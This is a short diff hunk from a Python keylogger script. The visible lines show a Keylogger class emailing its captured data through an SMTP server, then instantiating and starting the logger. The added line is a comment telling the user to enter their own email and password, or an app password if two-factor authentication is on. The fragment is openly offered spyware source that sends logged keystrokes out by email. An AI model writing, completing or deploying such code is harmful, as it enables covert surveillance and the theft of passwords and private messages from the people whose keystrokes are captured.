@@ -42,5 +42,6 @@ class Keylogger:
         server.sendmail(email , email , message)
         server.quit()
 
+#USE YOUR EMAIL AND PASSWORD , USE APP PASSWORD IF YOU HAVE 2FA ENABLED . 
 my_keylogger = Keylogger()
 my_keylogger.start() 
